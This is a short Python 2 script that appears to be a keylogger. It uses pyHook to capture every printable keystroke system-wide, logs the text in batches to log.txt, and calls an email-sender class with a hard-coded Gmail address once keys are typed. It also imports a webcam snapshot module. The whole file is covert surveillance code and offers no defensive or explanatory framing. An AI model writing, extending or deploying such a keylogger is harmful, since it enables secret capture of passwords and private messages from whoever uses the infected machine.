import pyHook, pygame, sys, logging
import numpy as np
from snapshot import Camera
from email_sender import Email


keys_pressed = 0
logs_arr = []
def OnKeyboardEvent(event):
    global logs_arr
    global keys_pressed

    logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(message)s')
    keyPressed = int(event.Ascii)

    if (keyPressed > 31 and keyPressed < 127):
        keys_pressed = keys_pressed + 1
        log_arr = logs_arr.append(chr(int(event.Ascii)))
        print keys_pressed
   
    if keys_pressed >= 2: 
        email = Email('peteratkinson1994@gmail.com', 'peteratkinson1994@gmail.com')
        email.send()

    if keys_pressed >= 300:    
       
        logging.log(10, ''.join(logs_arr))
        del logs_arr[:]
        keys_pressed = 0

    return True

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pygame.init()

while True:
    pygame.event.pump()
